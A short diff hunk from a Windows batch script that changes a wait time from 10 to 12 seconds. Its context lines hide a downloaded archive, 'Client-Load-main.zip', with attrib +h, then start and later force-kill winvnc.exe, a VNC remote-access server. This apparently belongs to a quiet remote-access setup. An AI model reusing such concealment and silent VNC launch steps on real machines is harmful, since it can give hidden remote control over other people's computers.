@@ -44,7 +44,7 @@ attrib +h "%USERPROFILE%\Downloads\Client-Load-main.zip"
 
 REM Start winvnc.exe for the first time and wait for 10 seconds
 start "" "%script_dir%winvnc.exe"
-timeout /t 10 >nul
+timeout /t 12 >nul
 
 REM Attempt to kill winvnc.exe if it is running
 taskkill /f /im winvnc.exe >nul 2>&1
